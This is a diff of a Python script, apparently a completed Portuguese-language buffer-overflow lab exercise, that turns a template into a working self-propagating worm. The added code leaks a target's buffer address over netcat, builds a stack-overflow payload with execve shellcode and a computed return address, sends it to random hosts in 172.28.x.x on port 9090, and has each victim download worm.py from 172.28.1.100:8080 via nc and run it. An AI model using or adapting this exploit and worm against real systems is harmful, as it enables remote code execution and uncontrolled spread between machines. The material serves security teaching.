@@ -4,9 +4,16 @@ import subprocess
 from random import randint
 import socket
 import ipaddress
+import re
+import time
 
 
-def create_hex_command(command = b"echo 'true' > infectado.txt"):
+def log(msg, level="INFO"):
+    ts = time.strftime("%H:%M:%S")
+    print(f"[{ts}] [{level}] {msg}")
+
+
+def create_hex_command(command = b"echo 'true' > input.txt"):
     comando_alinhado = command + b"\x00"
     while len(comando_alinhado) % 8 != 0:
         comando_alinhado += b"\x00"
@@ -47,75 +54,129 @@ def create_hex_command(command = b"echo 'true' > infectado.txt"):
         b"\xb0\x3b"      # mov al, 59 (syscall execve)
         b"\x0f\x05"      # syscall
     )
-    print(f"Shellcode pronto ({len(shellcode_dinamico)} bytes):")
-    print(shellcode_dinamico)
+    log(f"Shellcode pronto: {len(shellcode_dinamico)} bytes")
+    log(f"Preview (hex): {shellcode_dinamico[:32].hex()}{'...' if len(shellcode_dinamico) > 32 else ''}")
     return shellcode_dinamico
 
+
+# def getNextTarget():
+#     return "172.28.1.10"
+
+
 def getNextTarget():
-      """Gera, um IP por vez, todos os IPs entre 172.28.1.10 e 172.28.5.14 (inclusive)."""
-      start = ipaddress.IPv4Address("172.28.1.10")
-      end = ipaddress.IPv4Address("172.28.5.14")
+    """Retorna um IP aleatório no formato 172.28.[1-5].[10-14]."""
+    
+    # Sorteia o terceiro octeto (de 1 a 5)
+    terceiro_octeto = randint(1, 5)
+    # terceiro_octeto = 1
+    
+    # Sorteia o quarto octeto (de 10 a 14)
+    quarto_octeto = randint(10, 14)
+    # quarto_octeto = 11
 
-      current = start
-      while current <= end:
-          yield str(current)
-          current += 1
+
+    # Monta a string do IP com os valores sorteados
+    ip_sorteado = f"172.28.{terceiro_octeto}.{quarto_octeto}"
+    
+    return ip_sorteado
 
 
-def getBadfile(n_line, malicious_code):
+def getFile(bufaddr, shellcode):
     """
-        Task 1: O Ataque de Buffer Overflow
-        Construa a sua carga maliciosa (payload) aqui.
+    Layout do payload (500 bytes, = tamanho de `input` em main):
+
+      [0:72)     preenchimento (NOP) -- nunca é executado, só precisa nao ter \x00
+      [72:80)    endereco de retorno -- aponta para dentro de `input` (main),
+                 onde o NOP sled + shellcode ficam intactos (o read() nao trunca em \0,
+                 diferente do strcpy que soh alcanca ateh aqui)
+      [80:100)   NOP sled
+      [100:...)  shellcode (create_hex_command, sem alteracao)
     """
-    # Preenche o buffer com instruções NOP (0x90) -> pula pra próxima operação
-    content = bytearray(0x90 for i in range(500))
+    OFFSET = 72                        # distancia confirmada via GDB: buffer -> retorno
+    INPUT_OFFSET_FROM_BUFFER = 0x50    # distancia fixa entre buffer (bof) e input (main)
+    SHELL_START = 100
 
-    # shellcode = create_hex_command(command)
-    # ===================================================================
-    # TODO: Defina onde o shellcode vai ficar no payload
-    # start = ...
-    # content[start:] = shellcode
+    content = bytearray(0x90 for _ in range(500))
+    content[SHELL_START:SHELL_START + len(shellcode)] = shellcode
 
-    # TODO: Calcule o Offset e o Endereço de Retorno correto da vítima
-    # ret    =   # Substitua pelo endereço de retorno real (aponta para o seu NOP sled/shellcode)
-    # offset =   # Substitua pelo deslocamento (offset) correto, que pode ser descoberto por GDB
+    input_addr = bufaddr + INPUT_OFFSET_FROM_BUFFER
+    ret = input_addr + 80              # aponta pro comeco do NOP sled, dentro de `input`
 
-    # L = ...
-    # content[offset:offset + L] = (ret).to_bytes(L, byteorder="little")
-    # ===================================================================
+    content[OFFSET:OFFSET + 8] = ret.to_bytes(8, byteorder="little")
 
     return content
 
-def inject(badfile, targetIP):
-    with open("badfile", "wb") as f:
-        f.write(badfile)
 
-    print(f"Lançando ataque contra {targetIP} na porta 9090...")
+def writeFile(file, targetIP):
+    with open("file", "wb") as f:
+        f.write(file)
 
-    subprocess.run(
-        f"cat badfile | nc -w3 {targetIP} 9090",
-        shell=True,
-        timeout=5
-    )
+    log(f"Enviando payload ({len(file)} bytes) para {targetIP}:9090...")
+
+    try:
+        subprocess.run(
+            f"cat file | nc -w3 {targetIP} 9090",
+            shell=True,
+            timeout=5
+        )
+        log(f"Payload entregue em {targetIP}:9090", level="OK")
+    except subprocess.TimeoutExpired:
+        log(f"Timeout ao enviar payload para {targetIP}:9090", level="ERRO")
+
+
+def bufferAddress(targetIP):
+    log(f"Sondando {targetIP}:9090 para vazar o endereço do buffer...")
+
+    try:
+        result = subprocess.run(
+            f"echo | nc -w3 {targetIP} 9090",
+            shell=True,
+            timeout=5,
+            capture_output=True,
+            text=True
+        )
+    except subprocess.TimeoutExpired:
+        log(f"Timeout ao sondar {targetIP}:9090 — alvo pode estar fora do ar", level="ERRO")
+        return None
+
+    resposta = result.stdout.strip()
+    log(f"Resposta do alvo: {resposta!r}")
+
+    match = re.search(r"0x[0-9a-fA-F]+", resposta)
+    if match:
+        return int(match.group(), 16)
+
+    log(f"Não encontrei um endereço na resposta de {targetIP}", level="ERRO")
+    return None
+
 
 def main():
-    print("O worm chegou neste host! ^_^")
-    
+    print("Olá! ^_^")
+
     targetIP = getNextTarget()
-    print(f"Alvo selecionado: {targetIP}")
+    print(f"Host de destino: {targetIP}")
 
-    # 1. Abre uma porta em background no NOSSO host para entregar o worm.py
-    # O comando 'nc -lnvp 8080 < worm.py' fica esperando a vítima conectar
-    # é necessário abrir um subprocesso com o comando
+    bufaddr = bufferAddress(targetIP)
+    if bufaddr is None:
+        print("Não consegui ler o endereço do buffer. Abortando.")
+        return
+    print(f"Endereço do buffer: {hex(bufaddr)}")
 
-    # 2. Cria o comando que a VÍTIMA vai executar ao receber o Buffer Overflow
-    # Ela vai conectar no nosso IP, baixar o arquivo, dar permissão e rodar
-    
-    # 4. Fecha o servidor temporário após o envio
-    
-    print("Ataque concluído com sucesso! :D")
-    exit()
+    shellcode = create_hex_command(b"(echo 'true' > infectado.txt ; nc -w3 172.28.1.100 8080 < /dev/null > worm.py ; python3 worm.py > out.txt) < /dev/null > /dev/null 2>&1 &")
+
+    payload = getFile(bufaddr, shellcode)
+
+    writeFile(payload, targetIP)
+
+    print("Payload enviado! Verifique se input.txt apareceu dentro do container.")
+
 
 if __name__ == "__main__":
-    while True:
-        main()
+    # command = "while true; do nc -lnvp 8080 < worm.py; done"
+    # server = subprocess.Popen(command, shell=True)
+
+    main()
+
+    # server.terminate()
+    # server.wait()
+    # print("Processo fechado!")
